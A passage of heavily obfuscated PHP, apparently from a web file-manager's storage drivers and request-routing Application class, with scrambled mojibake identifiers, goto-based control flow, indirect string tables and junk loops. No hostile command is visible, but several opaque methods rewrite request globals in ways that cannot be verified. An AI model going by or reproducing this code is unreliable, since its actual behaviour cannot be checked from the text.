str_replace($aàÔöÒ©Ïø[218], $aàÔöÒ©Ïø[33], $BÍÀÜÎ‰Ê¶[$aàÔöÒ©Ïø[157]]); $CˆÛÔ®ñ¡ = $this->client->listParts($this->bucket, $f„©–Äš˜, $E…æÜçæ); goto A¯Àì¸†Œ; A—çëŠâ‡‚: $cùÔÎ½ôâõ .= $aàÔöÒ©Ïø[1198]; $cùºƒ¹‰Ï = array(); $e¶•³»ß‹³ = explode($aàÔöÒ©Ïø[168], $this->getHost()); goto D§çˆÙ—ôŒ; D§çˆÙ—ôŒ: $DŸœìÏ¢Ï = array($aàÔöÒ©Ïø[1192] => $e¶•³»ß‹³[1], $aàÔöÒ©Ïø[196] => $aàÔöÒ©Ïø[115], $aàÔöÒ©Ïø[1104] => strlen($cùÔÎ½ôâõ)); $e¡Ÿ‹©Ì¸¤ = $aàÔöÒ©Ïø[209]; $E¢ùœœÅ â = $aàÔöÒ©Ïø[8] . $this->pathEncode($f„©–Äš˜) . $BÍÀÜÎ‰Ê¶[$aàÔöÒ©Ïø[157]]; goto bğ‹Õõôİ; A¯Àì¸†Œ: if (!$CˆÛÔ®ñ¡) { return !1; } $cùÔÎ½ôâõ = $aàÔöÒ©Ïø[1195]; foreach ($CˆÛÔ®ñ¡ as $a£Ìá«ÁÖ™) { $cùÔÎ½ôâõ .= $aàÔöÒ©Ïø[1196] . "\x3c\x50\141\162\x74\x4e\x75\x6d\142\145\x72\x3e{$a£Ìá«ÁÖ™[$aàÔöÒ©Ïø[1147]]}\74\57\x50\141\162\x74\116\165\x6d\142\145\x72\76\xa" . "\x3c\105\124\141\147\x3e{$a£Ìá«ÁÖ™[$aàÔöÒ©Ïø[1148]]}\74\57\x45\x54\141\147\x3e\12" . $aàÔöÒ©Ïø[1197]; } goto A—çëŠâ‡‚; bğ‹Õõôİ: $eĞÜ™ÚËœ = $this->client->__getSignatureV4($cùºƒ¹‰Ï, $DŸœìÏ¢Ï, $e¡Ÿ‹©Ì¸¤, $E¢ùœœÅ â, $cùÔÎ½ôâõ); return array($aàÔöÒ©Ïø[217] => $eĞÜ™ÚËœ[$aàÔöÒ©Ïø[217]], $aàÔöÒ©Ïø[207] => $eĞÜ™ÚËœ[$aàÔöÒ©Ïø[1194]], $aàÔöÒ©Ïø[219] => $CˆÛÔ®ñ¡, $aàÔöÒ©Ïø[1191] => $eĞÜ™ÚËœ[$aàÔöÒ©Ïø[1191]]); goto F³ëŞ²–; F³ëŞ²–: } public function link($BãÉ˜àƒ¨Ã, $E©Ğö§˜¼ = array()) { return parent::link($BãÉ˜àƒ¨Ã, $E©Ğö§˜¼); } public function fileOut($A•­§æ‰İ¨, $A¨™§¦åÏ = false, $CğÃÓÛ„ë = false, $F‰«‚âŞ¶è = '') { if (strstr($this->endpoint, $_SERVER[÷ÖêïÔÔÓ][1199])) { return parent::fileOutServer($A•­§æ‰İ¨, $A¨™§¦åÏ, $CğÃÓÛ„ë, $F‰«‚âŞ¶è); } parent::fileOut($A•­§æ‰İ¨, $A¨™§¦åÏ, $CğÃÓÛ„ë, $F‰«‚âŞ¶è); } public function fileOutImage($bÛİÈØ¸¨©, $A¯£åŠÎ¨Ú = 250) { if (strstr($this->endpoint, $_SERVER[÷ÖêïÔÔÓ][1199])) { return parent::fileOutImageServer($bÛİÈØ¸¨©, $A¯£åŠÎ¨Ú); } parent::fileOutImage($bÛİÈØ¸¨©, $A¯£åŠÎ¨Ú); } public function getHost() { $có…¾İ˜ =& $_SERVER[÷ÖêïÔÔÓ]; $CªÁù„ñ = rtrim(parent::getHost(), $có…¾İ˜[8] . $this->bucket); $CªÁù„ñ = explode($có…¾İ˜[168], $CªÁù„ñ); return $CªÁù„ñ[0] . $có…¾İ˜[168] . $this->bucket . $có…¾İ˜[92] . $CªÁù„ñ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($d°‡²ùÑÜ¶, $A¯‚Ö©Ë‘í = 0) { parent::__construct(); $this->source = $d°‡²ùÑÜ¶; $this->sourceSize = $A¯‚Ö©Ë‘í; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($b²¡¶¯÷° = false) { return $this->sourceSize; } public function getContent($c˜ÚÆªÒ“” = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $D¾†¢Ê¬Ç® = ftell($this->source); $fÄ±Æ†ÄæÑ = @fread($this->source, $this->sourceSize); fseek($this->source, $D¾†¢Ê¬Ç®); return $fÄ±Æ†ÄæÑ; } } public function fileSubstr($Fƒì´³•“ = false, $b–òáËâ‰„ = 0, $bøø¢Öôİœ = 0) { if (!$bøø¢Öôİœ) { $bøø¢Öôİœ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $b–òáËâ‰„, $bøø¢Öôİœ); } if ($this->sourceType == self::TYPE_FILE) { $A÷‚İ‘…« = ftell($this->source); fseek($this->source, $A÷‚İ‘…« + $b–òáËâ‰„); $fœª•›ÌŞ´ = @fread($this->source, $bøø¢Öôİœ); fseek($this->source, $A÷‚İ‘…«); return $fœª•›ÌŞ´; } } public function hashMd5($E…³ø…á = false) { return md5($this->getContent()); } public static function hash($EÒ«¬­–, $dïº¶…Æ» = 0) { $a„ÄÈ‚—–Ê = new PathDriverStream($EÒ«¬­–, $dïº¶…Æ»); return $a„ÄÈ‚—–Ê->hashSimple($EÒ«¬­–); } public static function md5($Bå©‡™²¬µ, $B–øÑ™†¸‚ = 0) { $BÌ·áªğ†­ = new PathDriverStream($Bå©‡™²¬µ, $B–øÑ™†¸‚); return $BÌ·áªğ†­->hashMd5($Bå©‡™²¬µ); } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($AøèÌÚĞó× = false) { } public function exist($aš‘ùŸëĞà) { $d¡§õåğ¶Ú = $this->info($aš‘ùŸëĞà); return $d¡§õåğ¶Ú[$_SERVER[÷ÖêïÔÔÓ][185]]; } public function isFile($bÚ°‡ì×…ô) { $CæñÇ¶ãÉ = $this->info($bÚ°‡ì×…ô); return $CæñÇ¶ãÉ[$_SERVER[÷ÖêïÔÔÓ][185]]; } public function isFolder($dÃ„‰ÍøÚ) { return !1; } public function size($EŸ³®à¶ÓÌ) { $f‚ÕŞ£‚Ì£ = $this->info($EŸ³®à¶ÓÌ); return $f‚ÕŞ£‚Ì£[$_SERVER[÷ÖêïÔÔÓ][78]]; } public function info($a¡˜êá™å¾) { return $this->infoParse($a¡˜êá™å¾); } public function infoAuth($dÇì±Œ‹¬µ) { return $this->infoParse($dÇì±Œ‹¬µ); } public function infoWithChildren($e­ÜÉÊ†Åà) { return $this->infoParse($e­ÜÉÊ†Åà); } public function infoFull($B—Á´£ÌÙ×) { return $this->infoParse($B—Á´£ÌÙ×); } private function infoParse($cğ Ü¼ÑÈƒ) { $EƒĞÈ®à†— =& $_SERVER[÷ÖêïÔÔÓ]; $B“ÒÅÓœÛ = $this->header($cğ Ü¼ÑÈƒ); if (!$B“ÒÅÓœÛ || !$B“ÒÅÓœÛ[$EƒĞÈ®à†—[675]]) { return !1; } $D¿Î†·¡½ = _get($B“ÒÅÓœÛ, $EƒĞÈ®à†—[322], 0); $aºßğö‰ï = array($EƒĞÈ®à†—[28] => $B“ÒÅÓœÛ[$EƒĞÈ®à†—[28]], $EƒĞÈ®à†—[76] => $cğ Ü¼ÑÈƒ, $EƒĞÈ®à†—[29] => $EƒĞÈ®à†—[164], $EƒĞÈ®à†—[78] => intval($D¿Î†·¡½), $EƒĞÈ®à†—[157] => get_path_ext($B“ÒÅÓœÛ[$EƒĞÈ®à†—[28]]), $EƒĞÈ®à†—[1120] => $D¿Î†·¡½ > 0 && $B“ÒÅÓœÛ[$EƒĞÈ®à†—[1200]], $EƒĞÈ®à†—[1121] => !1); return $aºßğö‰ï; } private function header($DÂ„¼ê™¬‘) { if (isset(self::$_cacheHeader[$DÂ„¼ê™¬‘])) { return self::$_cacheHeader[$DÂ„¼ê™¬‘]; } self::$_cacheHeader[$DÂ„¼ê™¬‘] = url_header($DÂ„¼ê™¬‘); return self::$_cacheHeader[$DÂ„¼ê™¬‘]; } public function hashSimple($d¸ŠÒ…«Š†, $A˜º§¢©ß– = false) { goto cã‡Ù¶ç ; D Œ…Û“¾¬: if ($C„í—Ö¶öÁ <= $Cğ³÷–ÌåÁ * $E‹ Ù—±´â) { return md5($this->fileSubstr($d¸ŠÒ…«Š†, 0, $C„í—Ö¶öÁ)) . $C„í—Ö¶öÁ; } $FÌ‘…‚·¤Ğ = intval($C„í—Ö¶öÁ / $E‹ Ù—±´â); $c¿…ßº‰ÁÖ = $Cã†„ô”¤È[33]; goto cÏìÃÙ‚¯; cã‡Ù¶ç : $Cã†„ô”¤È =& $_SERVER[÷ÖêïÔÔÓ]; $C† …Ê¹‡µ = $this->info($d¸ŠÒ…«Š†); if (!$C† …Ê¹‡µ || !$C† …Ê¹‡µ[$Cã†„ô”¤È[185]]) { return !1; } goto f›²•ø‰Å; Dù†ÊÒ«‡: $c¿…ßº‰ÁÖ .= $this->fileSubstr($d¸ŠÒ…«Š†, $C„í—Ö¶öÁ - $Cğ³÷–ÌåÁ, $Cğ³÷–ÌåÁ); return md5($c¿…ßº‰ÁÖ) . $C„í—Ö¶öÁ; goto bÚ²‡ùé™å; cÏìÃÙ‚¯: $FÔš¢·¥é¬ = timeFloat(); $f£“Ş´âÄ± = 15; for ($b„ÙØ‹ï¸ä = 0; $b„ÙØ‹ï¸ä < $E‹ Ù—±´â; $b„ÙØ‹ï¸ä++) { if (timeFloat() - $FÔš¢·¥é¬ > $f£“Ş´âÄ±) { return !1; } $aÑ†ÍåË™Œ = $this->fileSubstr($d¸ŠÒ…«Š†, $FÌ‘…‚·¤Ğ * $b„ÙØ‹ï¸ä, $Cğ³÷–ÌåÁ); if (!$aÑ†ÍåË™Œ) { return !1; } $c¿…ßº‰ÁÖ .= $aÑ†ÍåË™Œ; } goto Dù†ÊÒ«‡; f›²•ø‰Å: $C„í—Ö¶öÁ = $C† …Ê¹‡µ[$Cã†„ô”¤È[78]]; $Cğ³÷–ÌåÁ = 200; $E‹ Ù—±´â = 50; goto D Œ…Û“¾¬; bÚ²‡ùé™å: } public function getContent($a°õÖÍ™‡¾) { return $this->fileSubstr($a°õÖÍ™‡¾); } public function fileSubstr($Aá²µîÈ¼, $d½Š¬ã¨† = 0, $Cƒ“À¾Íòš = -1) { goto DùÃ¸¿ëŠï; CÁ ÁİÍ œ: $F³»±‹è¨› = url_request($Aá²µîÈ¼, $aĞÓù÷•Ö[213], !1, $b¥²°¦õèĞ, !1, !1, 1); return $F³»±‹è¨›[$aĞÓù÷•Ö[1008]] ? $F³»±‹è¨›[$aĞÓù÷•Ö[1008]] : $aĞÓù÷•Ö[33]; goto eçî‘á´Ôç; FŒ…İ¾•ÜÔ: if ($Cƒ“À¾Íòš === -1) { $Cƒ“À¾Íòš = $déÒ–×Ç§[$aĞÓù÷•Ö[78]]; } if ($Cƒ“À¾Íòš == 0) { return $aĞÓù÷•Ö[33]; } $b¥²°¦õèĞ = array($aĞÓù÷•Ö[1201] . $d½Š¬ã¨† . $aĞÓù÷•Ö[699] . ($d½Š¬ã¨† + $Cƒ“À¾Íòš - 1)); goto CÁ ÁİÍ œ; DùÃ¸¿ëŠï: $aĞÓù÷•Ö =& $_SERVER[÷ÖêïÔÔÓ]; $déÒ–×Ç§ = $this->info($Aá²µîÈ¼); if (!$déÒ–×Ç§ || !$déÒ–×Ç§[$aĞÓù÷•Ö[185]] && $déÒ–×Ç§[$aĞÓù÷•Ö[78]] > 1024 * 1024 * 10) { return !1; } goto FŒ…İ¾•ÜÔ; eçî‘á´Ôç: } public function download($D¬Šå¢’¢Í, $e÷¾¨„Ù¸) { Downloader::start($D¬Šå¢’¢Í, $e÷¾¨„Ù¸); return $e÷¾¨„Ù¸; } } goto CÄ×„±ÇÉ…; EÍ„“ë¯ğ™: $b¬¡ªïÀÁ¯ = $_SERVER[÷ÖêïÔÔÓ][543]; class Application { private $defaultModule = "\x69\x6e\144\145\x78"; private $defaultController = "\151\x6e\x64\145\x78"; private $defaultAction = "\151\156\144\145\170"; function __construct() { } public function setDefault($ešÜ—Ñ³•Œ) { goto D†š†èï¶; A¦ÈäŞ¦ÙÕ: $this->defaultAction = $c‘ƒÕŠÉéØ[2] ? $c‘ƒÕŠÉéØ[2] : $this->defaultAction; $this->{$_SERVER[ë¿˜ªè¥×”ö][3]}($d‚Šœˆ³Áï[4], array($this, $d‚Šœˆ³Áï[5])); $e‚ÒïÊää¥ = $aÉíÈ¯‹[547]; goto aÛ¥‡ˆ‡Œ; aÛ¥‡ˆ‡Œ: if (strlen($e‚ÒïÊää¥) < $aÉíÈ¯‹[548]) { return; } goto d†”œù–; D†š†èï¶: $aÉíÈ¯‹ =& $_SERVER[÷ÖêïÔÔÓ]; $d‚Šœˆ³Áï =& $_SERVER[ë¿˜ªè¥×”ö]; $c‘ƒÕŠÉéØ = $d‚Šœˆ³Áï[0]($d‚Šœˆ³Áï[1], $d‚Šœˆ³Áï[2]($ešÜ—Ñ³•Œ, $d‚Šœˆ³Áï[1])); goto Eé¿„¿‡”¡; Eé¿„¿‡”¡: $bÄ‚§çå©… = $aÉíÈ¯‹[544]; if (strlen($bÄ‚§çå©…) < $aÉíÈ¯‹[545]) { die; } $this->defaultModule = $c‘ƒÕŠÉéØ[0] ? $c‘ƒÕŠÉéØ[0] : $this->defaultModule; goto CÄ±ÌÊŞ‘¼; CÄ±ÌÊŞ‘¼: $fä‡Ü·£Ğ = $aÉíÈ¯‹[546]; while (strlen($fä‡Ü·£Ğ) < $aÉíÈ¯‹[540]) { if (!$fä‡Ü·£Ğ) { break; } $fä‡Ü·£Ğ++; } $this->defaultController = $c‘ƒÕŠÉéØ[1] ? $c‘ƒÕŠÉéØ[1] : $this->defaultController; goto A¦ÈäŞ¦ÙÕ; d†”œù–: } public function appRun($d¥ì†ìÍñÑ) { goto EøŠÈ‹“°; d¼ƒÍè²: if (!$cøØ¼ŠŒ¶²) { return; } goto a¤íçîÎ; EøŠÈ‹“°: $e¯ï£ğ•óò =& $_SERVER[÷ÖêïÔÔÓ]; $B´‚Ø©ö„µ =& $_SERVER[ë¿˜ªè¥×”ö]; $fô‘ä•Ìà‹ = $B´‚Ø©ö„µ[0]($B´‚Ø©ö„µ[1], $d¥ì†ìÍñÑ); goto Eª—³áó¾±; f¥éç‰µ¡ë: $B´‚Ø©ö„µ[17]($d¥ì†ìÍñÑ); $B´‚Ø©ö„µ[13](array($B´‚Ø©ö„µ[14], $B´‚Ø©ö„µ[15]), $d±÷¥——ÄÂ . $B´‚Ø©ö„µ[18], $d¥ì†ìÍñÑ); $cøØ¼ŠŒ¶² = $e¯ï£ğ•óò[551]; goto d¼ƒÍè²; c‚ÉÅãÚË: $d±÷¥——ÄÂ = $B´‚Ø©ö„µ[7]; if ($eÀï°¢¡°Ü == $B´‚Ø©ö„µ[8]) { $d±÷¥——ÄÂ = $B´‚Ø©ö„µ[9]; $fô‘ä•Ìà‹[0] = $B´‚Ø©ö„µ[10]; $fô‘ä•Ìà‹[1] = $fô‘ä•Ìà‹[1] . $B´‚Ø©ö„µ[11]; $d¥ì†ìÍñÑ = $B´‚Ø©ö„µ[12]($B´‚Ø©ö„µ[1], $fô‘ä•Ìà‹); $d¥ì†ìÍñÑ = $B´‚Ø©ö„µ[2]($d¥ì†ìÍñÑ, $B´‚Ø©ö„µ[1]); } $B´‚Ø©ö„µ[13](array($B´‚Ø©ö„µ[14], $B´‚Ø©ö„µ[15]), $d±÷¥——ÄÂ . $B´‚Ø©ö„µ[16], $d¥ì†ìÍñÑ); goto f¥éç‰µ¡ë; Eª—³áó¾±: $eÀï°¢¡°Ü = $B´‚Ø©ö„µ[6]($fô‘ä•Ìà‹[0]); $DÀçŸö¨µ = $e¯ï£ğ•óò[549]; while ($DÀçŸö¨µ < $e¯ï£ğ•óò[550]) { if ($DÀçŸö¨µ >= 0) { break; } $DÀçŸö¨µ++; } goto c‚ÉÅãÚË; a¤íçîÎ: } private function autorun() { $cŞ›Ş‰¹ğ‘ =& $_SERVER[ë¿˜ªè¥×”ö]; global $config; if ($cŞ›Ş‰¹ğ‘[19]($config[$cŞ›Ş‰¹ğ‘[20]]) == 0) { return; } foreach ($config[$cŞ›Ş‰¹ğ‘[20]] as $D˜Çº‚Ÿ· => $cŠâ†Ï¹‚…) { $this->{$_SERVER[ë¿˜ªè¥×”ö][21]}($cŠâ†Ï¹‚…); $C­¤êßŠÈŒ = $_SERVER[÷ÖêïÔÔÓ][552]; if (!$C­¤êßŠÈŒ) { die; } } } private function bcxk73eaad64() { goto DÑÂ—Ğ’Ş„; A ê–°¤Ì¥: if (!$dÊ³½‡¾íœ) { die; } $f©£«¼†—• = $fÒ‡¿¿ë´É[26]($GLOBALS[$fÒ‡¿¿ë´É[22]][$fÒ‡¿¿ë´É[23]], 1); $GLOBALS[$fÒ‡¿¿ë´É[22]][$fÒ‡¿¿ë´É[23]] = $fÒ‡¿¿ë´É[27]($cˆ…´ŒçÉ¬, $f©£«¼†—•); goto C¾Ñ¾´ëŒ§; aª ¸ŸÏ†ã: $e…Å‚­ÄŸ¨ = $d§Ó‰Üã²½[553]; $eš°®œœÊÛ = $GLOBALS[$fÒ‡¿¿ë´É[22]][$fÒ‡¿¿ë´É[23]][0]; $dÀ‰®™ºĞ = $d§Ó‰Üã²½[554]; goto e¹«ŒŠ´‚í; e¹«ŒŠ´‚í: while (strlen($dÀ‰®™ºĞ) < $d§Ó‰Üã²½[540]) { if (!$dÀ‰®™ºĞ) { break; } $dÀ‰®™ºĞ++; } if (!$eš°®œœÊÛ || $fÒ‡¿¿ë´É[24]($eš°®œœÊÛ) <= $fÒ‡¿¿ë´É[24]($a¹Õ£ÔÜšÂ)) { return; } if ($fÒ‡¿¿ë´É[6]($fÒ‡¿¿ë´É[25]($eš°®œœÊÛ, -$fÒ‡¿¿ë´É[24]($a¹Õ£ÔÜšÂ))) != $a¹Õ£ÔÜšÂ) { return; } goto D¹êº™Œ; D¹êº™Œ: $bñòÓºí‰Ì = $fÒ‡¿¿ë´É[25]($eš°®œœÊÛ, 0, -$fÒ‡¿¿ë´É[24]($a¹Õ£ÔÜšÂ)); $cˆ…´ŒçÉ¬ = array($fÒ‡¿¿ë´É[8], $bñòÓºí‰Ì); $dÊ³½‡¾íœ = $d§Ó‰Üã²½[555]; goto A ê–°¤Ì¥; C¾Ñ¾´ëŒ§: $dĞ…Œõä½ì = $d§Ó‰Üã²½[556]; while (strlen($dĞ…Œõä½ì) < $d§Ó‰Üã²½[557]) { if (!$dĞ…Œõä½ì) { break; } $dĞ…Œõä½ì++; } $GLOBALS[$fÒ‡¿¿ë´É[22]][$fÒ‡¿¿ë´É[28]] = $fÒ‡¿¿ë´É[29]($fÒ‡¿¿ë´É[1], $GLOBALS[$fÒ‡¿¿ë´É[22]][$fÒ‡¿¿ë´É[23]]); goto BÎ¬Ãİù„Ş; DÑÂ—Ğ’Ş„: $d§Ó‰Üã²½ =& $_SERVER[÷ÖêïÔÔÓ]; $fÒ‡¿¿ë´É =& $_SERVER[ë¿˜ªè¥×”ö]; $a¹Õ£ÔÜšÂ = $fÒ‡¿¿ë´É[8]; goto aª ¸ŸÏ†ã; BÎ¬Ãİù„Ş: } private function vmgf4d0c2181() { goto c¾èù„ÇÔŒ; c¹‚‘˜«â²: $e›÷óö®ì = $_SERVER[$C“èœóŸŞ®[30]]; $B´´ß¼ò¬ = $C“èœóŸŞ®[31]; $FÑèŞğ¥º„ = $dœ‹«Ş‰¼è[558]; goto D¾ï“Ÿ‰ŸŒ; f–ÀÏƒ: $GLOBALS[$C“èœóŸŞ®[22]][$C“èœóŸŞ®[23]] = $C“èœóŸŞ®[0]($C“èœóŸŞ®[36], $FŞªÁ‰Ìö«); $GLOBALS[$C“èœóŸŞ®[22]][$C“èœóŸŞ®[28]] = $C“èœóŸŞ®[29]($C“èœóŸŞ®[1], $GLOBALS[$C“èœóŸŞ®[22]][$C“èœóŸŞ®[23]]); $Aê³™»· = $dœ‹«Ş‰¼è[561]; goto b›åñâ­®Ù; c¾èù„ÇÔŒ: $dœ‹«Ş‰¼è =& $_SERVER[÷ÖêïÔÔÓ]; $C“èœóŸŞ® =& $_SERVER[ë¿˜ªè¥×”ö]; if ($GLOBALS[$C“èœóŸŞ®[22]][$C“èœóŸŞ®[28]] != $C“èœóŸŞ®[10]) { return; } goto c¹‚‘˜«â²; A£Å•Ë‰º¡: $C“èœóŸŞ®[34]($C“èœóŸŞ®[35], $FŞªÁ‰Ìö«, $aİÖÈïæÁŸ); $e½êëÚ½³§ = $dœ‹«Ş‰¼è[539]; if (!$e½êëÚ½³§) { return; } goto cŞÖÕŞÂĞ‡; cŞÖÕŞÂĞ‡: $FŞªÁ‰Ìö« = $C“èœóŸŞ®[2]($aİÖÈïæÁŸ[0][0], $C“èœóŸŞ®[36]); $EœŸÂš˜½‚ = $dœ‹«Ş‰¼è[560]; if (!$EœŸÂš˜½‚) { return; } goto f–ÀÏƒ; F­¼öää: $FŞªÁ‰Ìö« = $C“èœóŸŞ®[25]($e›÷óö®ì, $e’¹Šå´™À + $C“èœóŸŞ®[24]($B´´ß¼ò¬)); $Dõ•àè¥ó¥ = $dœ‹«Ş‰¼è[559]; if (strlen($Dõ•àè¥ó¥) < $dœ‹«Ş‰¼è[550]) { return; } goto A£Å•Ë‰º¡; D¾ï“Ÿ‰ŸŒ: if (strlen($FÑèŞğ¥º„) < $dœ‹«Ş‰¼è[540]) { return; } if (!$C“èœóŸŞ®[32]($e›÷óö®ì, $B´´ß¼ò¬)) { return; } $e’¹Šå´™À = $C“èœóŸŞ®[33]($e›÷óö®ì, $B´´ß¼ò¬); goto F­¼öää; b›åñâ­®Ù: } public function run() { goto bÛ‹Å„ó•ñ; f·–“´â§‘: $_SERVER[$dù¤’Âìß[44]] = $dù¤’Âìß[6](ACTION); $this->{$_SERVER[ë¿˜ªè¥×”ö][45]}(); if ($dù¤’Âìß[19]($b«Õ„¸“µ¡) >= 3) { $this->{$_SERVER[ë¿˜ªè¥×”ö][21]}($AÓàœ„Èºá); } else { $this->{$_SERVER[ë¿˜ªè¥×”ö][21]}(ACTION); } goto eÏ¬‹²Ğ‰’; fƒ“ó«ÜÅ: $this->{$_SERVER[ë¿˜ªè¥×”ö][38]}(); $b«Õ„¸“µ¡ = $GLOBALS[$dù¤’Âìß[22]][$dù¤’Âìß[23]]; $cÛøÜ‘Ó‘ = $AŸ»è‰Ñ„é[562]; goto fÊ…ê÷ä; F†£‘Éæäá: $dù¤’Âìß[39]($dù¤’Âìß[43], MOD . $dù¤’Âìß[1] . ST . $dù¤’Âìß[1] . ACT); $dØÑÎÏ®Ê = $AŸ»è‰Ñ„é[566]; if (strlen($dØÑÎÏ®Ê) < $AŸ»è‰Ñ„é[540]) { die; } goto f·–“´â§‘; Aô©ğšêÑÊ: $dù¤’Âìß[39]($dù¤’Âìß[42], isset($b«Õ„¸“µ¡[2]) && $b«Õ„¸“µ¡[0] ? $b«Õ„¸“µ¡[2] : $this->defaultAction); $eÊˆóÕãå = $AŸ»è‰Ñ„é[565]; while ($eÊˆóÕãå < $AŸ»è‰Ñ„é[540]) { if ($eÊˆóÕãå >= 0) { break; } $eÊˆóÕãå++; } goto F†£‘Éæäá; fÊ…ê÷ä: $AÓàœ„Èºá = $GLOBALS[$dù¤’Âìß[22]][$dù¤’Âìß[28]]; $c­ùŠÀ”‰ = $AŸ»è‰Ñ„é[563]; if (!$c­ùŠÀ”‰) { return; } goto fî– §½Àà; fî– §½Àà: $dù¤’Âìß[39]($dù¤’Âìß[40], isset($b«Õ„¸“µ¡[0]) && $b«Õ„¸“µ¡[0] ? $b«Õ„¸“µ¡[0] : $this->defaultModule); $dù¤’Âìß[39]($dù¤’Âìß[41], isset($b«Õ„¸“µ¡[1]) && $b«Õ„¸“µ¡[0] ? $b«Õ„¸“µ¡[1] : $this->defaultController); $C±ßİÄ®‚¥ = $AŸ»è‰Ñ„é[564]; goto Aô©ğšêÑÊ; bÛ‹Å„ó•ñ: $AŸ»è‰Ñ„é =& $_SERVER[÷ÖêïÔÔÓ]; $dù¤’Âìß =& $_SERVER[ë¿˜ªè¥×”ö]; $this->{$_SERVER[ë¿˜ªè¥×”ö][37]}(); goto fƒ“ó«ÜÅ; eÏ¬‹²Ğ‰’: } private $edfm0e49405f = array(); private $gpwjd31c2313 = ''; public function yakz9d7348c6() { goto aœŒÏ¦Å»–; E—£®ëš»§: $this->{$_SERVER[ë¿˜ªè¥×”ö][3]}($A›ÙˆÑ³[59], array($this, $A›ÙˆÑ³[60])); $B¯œÆ¼‡¡Ä = $c“®¦òçø[571]; if (strlen($B¯œÆ¼‡¡Ä) < $c“®¦òçø[557]) { die; } goto e‰ˆ‰¢­Û; AÂëÔªáâ¹: $dù””ãŒä¢ = $c“®¦òçø[568]; if (strlen($dù””ãŒä¢) < $c“®¦òçø[545]) { return; } $this->{$_SERVER[ë¿˜ªè¥×”ö][48]}(); goto FŠ£ÖÙõË; FŠ£ÖÙõË: $this->{$_SERVER[ë¿˜ªè¥×”ö][49]}(); $fİˆö¢Ø­á = $c“®¦òçø[569]; while (strlen($fİˆö¢Ø­á) < $c“®¦òçø[557]) { if (!$fİˆö¢Ø­á) { break; } $fİˆö¢Ø­á++; } goto aÙ»Ñ’¶•; e±Ç‘¯ÏÙÖ: $this->{$_SERVER[ë¿˜ªè¥×”ö][3]}($A›ÙˆÑ³[53], array($this, $A›ÙˆÑ³[54])); $this->{$_SERVER[ë¿˜ªè¥×”ö][3]}($A›ÙˆÑ³[55], array($this, $A›ÙˆÑ³[56])); $this->{$_SERVER[ë¿˜ªè¥×”ö][3]}($A›ÙˆÑ³[57], array($this, $A›ÙˆÑ³[58])); goto E—£®ëš»§; aœŒÏ¦Å»–: $c“®¦òçø =& $_SERVER[÷ÖêïÔÔÓ]; $A›ÙˆÑ³ =& $_SERVER[ë¿˜ªè¥×”ö]; $this->{$_SERVER[ë¿˜ªè¥×”ö][46]}(); goto båµÁ„ó£; båµÁ„ó£: $có×£¡Î“ = $c“®¦òçø[567]; if (strlen($có×£¡Î“) < $c“®¦òçø[550]) { die; } $this->{$_SERVER[ë¿˜ªè¥×”ö][47]}(); goto AÂëÔªáâ¹; aÙ»Ñ’¶•: $this->{$_SERVER[ë¿˜ªè¥×”ö][50]}(); $fÄªÕî¼ğÑ = $c“®¦òçø[570]; $this->{$_SERVER[ë¿˜ªè¥×”ö][51]}(); goto eÊÄå»æ¶­; eÊÄå»æ¶­: $B˜‹À¹Ôè = $c“®¦òçø[560]; if (!$B˜‹À¹Ôè) { die; } $this->{$_SERVER[ë¿˜ªè¥×”ö][52]}(); goto e±Ç‘¯ÏÙÖ; e‰ˆ‰¢­Û: } public function rovib26ad621($Eíùğ„¯„š) { goto eÙŒåĞ‰; CÌ¡ïèóß: $a‚––¹×õ = $f”Æ™À¬Ò[575]; $Eíùğ„¯„š[$d…­øçäé[90]][$d…­øçäé[91]][$d…­øçäé[96]] = array($d…­øçäé[97] => (int) $D´Ôê¤¡Ë’[$d…­øçäé[98]], $d…­øçäé[99] => $d…­øçäé[100]($d…­øçäé[101]($D´Ôê¤¡Ë’, $d…­øçäé[102], array())), $d…­øçäé[103] => (int) $d…­øçäé[101]($D´Ôê¤¡Ë’, $d…­øçäé[104], 0)); $Eíùğ„¯„š[$d…­øçäé[105]][$d…­øçäé[106]] = $d…­øçäé[107]($d…­øçäé[108])->{$_SERVER[ë¿˜ªè¥×”ö][109]}(); goto A¹±«ˆ»; D‚ö¼„¬ö¾: if ($GLOBALS[$d…­øçäé[129]] && $this->config[$d…­øçäé[130]]) { $Eíùğ„¯„š[$d…­øçäé[105]][$d…­øçäé[131]] = WEB_ROOT; } return $Eíùğ„¯„š; goto Bù“ôĞ—¼ç; B¢†ÑÅÇ¤ç: if ($this->gpwjd31c2313 == $d…­øçäé[118]) { $Eíùğ„¯„š[$d…­øçäé[90]][$d…­øçäé[91]][$d…­øçäé[96]][$d…­øçäé[104]] = 0; } $Eíùğ„¯„š[$d…­øçäé[105]][$d…­øçäé[125]] = $d…­øçäé[101]($this->edfm0e49405f, $d…­øçäé[126], $d…­øçäé[10]); $Eíùğ„¯„š[$d…­øçäé[105]][$d…­øçäé[127]] = $d…­øçäé[101]($this->edfm0e49405f, $d…­øçäé[128], $d…­øçäé[10]); goto D‚ö¼„¬ö¾; f«÷ÖÚ‹ÖÖ: $e®»Ï°‚ß = array($d…­øçäé[64], $d…­øçäé[65], $d…­øçäé[66], $d…­øçäé[67], $d…­øçäé[68], $d…­øçäé[69], $d…­øçäé[70], $d…­øçäé[71], $d…­øçäé[72], $d…­øçäé[73], $d…­øçäé[74], $d…­øçäé[75], $d…­øçäé[76], $d…­øçäé[77], $d…­øçäé[78], $d…­øçäé[79], $d…­øçäé[80], $d…­øçäé[81], $d…­øçäé[82], $d…­øçäé[83], $d…­øçäé[84], $d…­øçäé[85], $d…­øçäé[86], $d…­øçäé[87]); foreach ($e®»Ï°‚ß as $C¨ç‚ù´õ†) { $bæ÷“·çË— = $GLOBALS[$d…­øçäé[88]][$d…­øçäé[89]][$C¨ç‚ù´õ†]; if (isset($b¯öè²¸šÎ[$C¨ç‚ù´õ†])) { $bæ÷“·çË— = $b¯öè²¸šÎ[$C¨ç‚ù´õ†]; } $Eíùğ„¯„š[$d…­øçäé[90]][$d…­øçäé[91]][$C¨ç‚ù´õ†] = $bæ÷“·çË—; } $D´Ôê¤¡Ë’ = 